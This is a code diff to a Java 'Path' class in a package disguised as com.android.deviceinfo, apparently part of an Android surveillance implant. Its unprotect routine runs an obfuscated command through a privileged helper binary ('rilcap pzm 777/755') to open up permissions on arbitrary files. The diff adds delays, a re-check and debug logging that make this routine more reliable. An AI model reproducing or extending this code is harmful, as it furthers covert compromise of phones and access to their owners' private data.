@@ -19,6 +19,7 @@ import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DateTime;
+import com.android.deviceinfo.util.Utils;
 import com.android.m.M;
 
 // TODO: Auto-generated Javadoc
@@ -222,8 +223,11 @@ public class Path {
 			unprotect(file.getParent(), depth - 1, fullmode);
 		}
 		
-		return unprotect(path, fullmode);
-	
+		boolean ret = unprotect(path, fullmode);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (unprotect) ret: " + path + " " + ret);
+		}
+		return ret;
 	}
 
 	public static boolean unprotect(String path, boolean fullmode) {
@@ -232,7 +236,7 @@ public class Path {
 			File file = new File(path);
 
 			if (fullmode) {
-				if (file.exists() && file.canRead() && file.canWrite()) {
+				if (file.canRead() && file.canWrite()) {
 					return true;
 				}
 				if (Cfg.DEBUG) {
@@ -240,8 +244,9 @@ public class Path {
 				}
 				// h_9=/system/bin/ntpsvd pzm 777
 				Runtime.getRuntime().exec(M.e("/system/bin/rilcap pzm 777 ") + " " + path);
+				Utils.sleep(200);
 			} else {
-				if (file.exists() && file.canRead()) {
+				if (file.canRead()) {
 					return true;
 				}
 				if (Cfg.DEBUG) {
@@ -249,8 +254,13 @@ public class Path {
 				}
 				// h_3=/system/bin/ntpsvd pzm 755
 				Runtime.getRuntime().exec(M.e("/system/bin/rilcap pzm 755 ") + " " + path);
+				Utils.sleep(200);
 			}
 
+			file = new File(path);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (unprotect) return: " + path + " " + file.canRead());
+			}
 			return file.canRead();
 		} catch (IOException ex) {
 			Check.log(TAG + " Error (unprotect): " + ex);
